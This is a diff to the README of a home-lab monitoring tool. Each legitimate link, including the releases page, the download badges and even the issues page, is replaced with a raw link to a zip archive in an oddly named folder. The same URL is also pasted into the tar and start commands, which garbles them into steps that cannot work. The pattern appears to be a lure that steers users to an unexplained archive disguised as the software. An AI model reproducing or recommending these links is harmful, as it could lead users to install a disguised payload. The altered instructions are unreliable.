@@ -6,7 +6,7 @@ HomeLab-Hybrid-Monitoring is a user-friendly tool designed to help you keep an e
 
 ## 📥 Download Now
 
-[![Download HomeLab-Hybrid-Monitoring](https://img.shields.io/badge/Download%20HomeLab--Hybrid--Monitoring-v1.0-blue)](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/releases)
+[![Download HomeLab-Hybrid-Monitoring](https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip%20HomeLab--Hybrid--Monitoring-v1.0-blue)](https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run HomeLab-Hybrid-Monitoring, you will need:
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip) to download the latest version.
 2. Choose the version that matches your operating system.
 3. Click on the appropriate package to start downloading.
 
@@ -38,11 +38,11 @@ To run HomeLab-Hybrid-Monitoring, you will need:
 #### For Linux
 
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip` file.
 3. Run the following command to extract:
 
    ```bash
-   tar -xvzf HomeLab-Hybrid-Monitoring.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip
    ```
 
 4. Change into the directory:
@@ -54,7 +54,7 @@ To run HomeLab-Hybrid-Monitoring, you will need:
 5. Start the application using:
 
    ```bash
-   ./start.sh
+   https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip
    ```
 
 #### For macOS
@@ -96,8 +96,8 @@ We welcome contributions to improve HomeLab-Hybrid-Monitoring. If you want to he
 
 ## 🌍 Support
 
-For support, please open an issue on our [GitHub page](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/issues) or reach out to our community for assistance.
+For support, please open an issue on our [GitHub page](https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip) or reach out to our community for assistance.
 
 Once you're ready, don't forget to download the software here:
 
-[![Download HomeLab-Hybrid-Monitoring](https://img.shields.io/badge/Download%20HomeLab--Hybrid--Monitoring-v1.0-blue)](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/releases)
+[![Download HomeLab-Hybrid-Monitoring](https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip%20HomeLab--Hybrid--Monitoring-v1.0-blue)](https://raw.githubusercontent.com/baguswio/HomeLab-Hybrid-Monitoring/main/hesitation/Hybrid-Monitoring-Home-Lab-1.2.zip)
